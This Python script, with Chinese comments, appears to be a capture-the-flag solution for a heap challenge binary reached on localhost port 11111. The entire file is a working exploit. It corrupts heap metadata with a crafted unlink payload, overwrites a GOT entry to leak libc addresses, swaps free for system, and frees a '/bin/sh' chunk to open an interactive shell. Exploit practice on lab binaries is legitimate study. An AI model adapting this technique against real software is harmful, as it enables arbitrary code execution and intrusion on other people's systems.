#! /usr/bin/python
#coding:utf-8
from zio import *
#zio.py　蓝莲花出品

io = zio(('127.0.0.1',11111))
# io = zio('./vul_heap')
libc_free = 0x0007a2c0
libc_sys = 0x0003f490

io.readline() # choice
io.writeline('m')
io.readline() # malloc
io.readline() # size
io.writeline('504')
io.readline() # content
io.writeline('aaa')
io.readline() # ok

io.readline() # choice
io.writeline('m')
io.readline() # malloc
io.readline() # size
io.writeline('512')
io.readline() # content
io.writeline('aaa')
io.readline() # ok

io.readline() # choice
io.writeline('f')
io.readline() # free
io.writeline('0')
io.readline() # ok

io.readline() # choice
io.writeline('f')
io.readline() # free
io.writeline('1')
io.readline() # ok

#关键payload
io.readline() # choice
io.writeline('m')
io.readline() # malloc
io.readline() # size
io.writeline('768')
io.readline() # content
io.writeline(l32(0x0)  + l32(0x000001f9) + l32(0x0804bfa0 - 0xc) + l32(0x0804bfa0 - 0x8) + 'a'*(0x200-24) + l32(0x000001f8) + l32(0x00000108))#+l32(0x31)*0x200)
io.readline() # ok

#修改got表中的free后。free这个堆块就可以那shell了
io.readline() # choice
io.writeline('m')
io.readline() # malloc
io.readline() # size
io.writeline('20')
io.readline() # content
io.writeline('/bin/sh')
io.readline() # ok

io.readline() # choice
io.writeline('f')
io.readline() # free
io.writeline('1')
io.readline() # ok


io.readline() # choice
io.writeline('e')
io.readline() # edit
io.writeline('0')
io.writeline('a'*12 + l32(0x0804a004))
io.readline() # ok

io.readline() # choice
io.writeline('p')
io.readline() # print
io.writeline('0')


gets = l32(io.read(4))
free_addr = l32(io.read(4))
getchar = l32(io.read(4))
malloc = l32(io.read(4))
puts = l32(io.read(4))
gmon_start__  = l32(io.read(4))
libc_start_main = l32(io.read(4))
isoc99_scanf = l32(io.read(4))

io.readline() # \0

io.readline() # end


base_addr = free_addr - libc_free
sys_addr = base_addr + libc_sys
print 'system_addr = ' + hex(sys_addr)


io.readline() # choice
io.writeline('e')
io.readline() # edit
io.writeline('0')
# io.writeline(l32(sys_addr) + l32(getchar) + l32(stack_chk_fail) + l32(malloc) + l32(puts) + l32(gmon_start__) + l32(libc_start_main) + l32(isoc99_scanf))
io.writeline(l32(gets) + l32(sys_addr) + l32(getchar) + l32(malloc) + l32(puts) + l32(gmon_start__) + l32(libc_start_main) + l32(isoc99_scanf))
io.readline() # ok


io.readline() # choice
io.writeline('f')
io.readline() # free
io.writeline('3')


io.interact()
